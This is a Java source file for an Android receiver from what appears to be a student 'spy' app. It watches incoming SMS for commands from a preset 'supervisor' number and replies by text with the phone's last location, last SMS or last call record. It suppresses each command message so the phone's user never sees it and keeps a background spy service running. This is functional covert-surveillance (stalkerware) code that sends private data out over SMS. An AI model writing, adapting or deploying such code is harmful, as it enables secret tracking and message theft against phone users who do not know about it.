package edu.uj.jkordas.spy.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import edu.uj.jkordas.spy.DAO.CallDataSource;
import edu.uj.jkordas.spy.DAO.LocationDataSource;
import edu.uj.jkordas.spy.DAO.SmsDataSource;
import edu.uj.jkordas.spy.POJO.Call;
import edu.uj.jkordas.spy.POJO.Location;
import edu.uj.jkordas.spy.POJO.Sms;
import edu.uj.jkordas.spy.SpyService;
import edu.uj.jkordas.spy.developer.Logger;
import edu.uj.jkordas.spy.settings.Preferences;


public class SmsReceiver extends BroadcastReceiver {
    private static final String GET_LAST_LOCATION = "get_last_location";
    private static final String GET_LAST_MESSAGE = "get_last_message";
    private static final String GET_LAST_CALL = "get_last_call";

    private String lastMessage;
    private String lastLocation;
    private String lastCall;

    @Override
    public void onReceive(Context context, Intent intent) {
        Logger.log(context, "message received");

        Bundle bundle = intent.getExtras();
        Object[] messages = (Object[]) bundle.get("pdus");
        SmsMessage[] sms = new SmsMessage[messages.length];
        // Create messages for each incoming PDU
        for (int n = 0; n < messages.length; n++) {
            sms[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
        }
        for (SmsMessage msg : sms) {
            // Verify if the message came from our known sender
            String sender = msg.getOriginatingAddress();
            String content = msg.getMessageBody();
            if (shouldMessageBeSnaffled(context, sender, content)) {
                Logger.log(context, sender + " message snaffled");
                // take appropriate action
                String action = getAction(context, content);
                if (action != null) {
                    if (action.equals(GET_LAST_LOCATION)) {
                        LocationDataSource locationDataSource = new LocationDataSource(
                                context);
                        locationDataSource.open();
                        Location location = locationDataSource.getLastLocation();
                        locationDataSource.close();
                        if (!location.toString().equals(lastLocation)) {
                            sendMessage(sender, location.toString());
                        }
                        lastLocation = location.toString();
                    } else if (action.equals(GET_LAST_MESSAGE)) {
                        SmsDataSource smsDataSource = new SmsDataSource(context);
                        smsDataSource.open();
                        Sms message = smsDataSource.getLastSms();
                        smsDataSource.close();
                        if (!message.toString().equals(lastMessage)) {
                            sendMessage(sender, message.toString());
                        }
                        lastLocation = message.toString();
                    } else if (action.equals(GET_LAST_CALL)) {
                        CallDataSource callDataSource = new CallDataSource(context);
                        callDataSource.open();
                        Call call = callDataSource.getLastCall();
                        callDataSource.close();
                        if (!call.toString().equals(lastCall)) {
                            sendMessage(sender, call.toString());
                        }
                        lastLocation = call.toString();
                    }
                }
                //make sure user wont see this message
                this.abortBroadcast();
            }
        }

        restartSpyService(context);
    }

    private void restartSpyService(Context context) {
        Intent i = new Intent(context, SpyService.class);
        context.startService(i);
    }

    private boolean shouldMessageBeSnaffled(Context context, String sender, String messageBody) {
        String supervisorNumber = Preferences.getSupervisorNumber(context);
        String supervisorPrefix = Preferences.getSupervisorPrefix(context);

        if (sender.equals(supervisorNumber)
                && messageBody.length() >= supervisorPrefix.length()
                && messageBody.substring(0, supervisorPrefix.length()).equals(
                supervisorPrefix)) {
            return true;
        }

        return false;
    }

    private String getAction(Context context, String message) {
        String supervisorPrefix = Preferences.getSupervisorPrefix(context);
        if (message.length() <= supervisorPrefix.length()) {
            return null;
        }
        return message.substring(supervisorPrefix.length());
    }

    private void sendMessage(String number, String content) {
        SmsManager smsManager = SmsManager.getDefault();

        smsManager.sendTextMessage(number, null, content, null, null);
    }
}
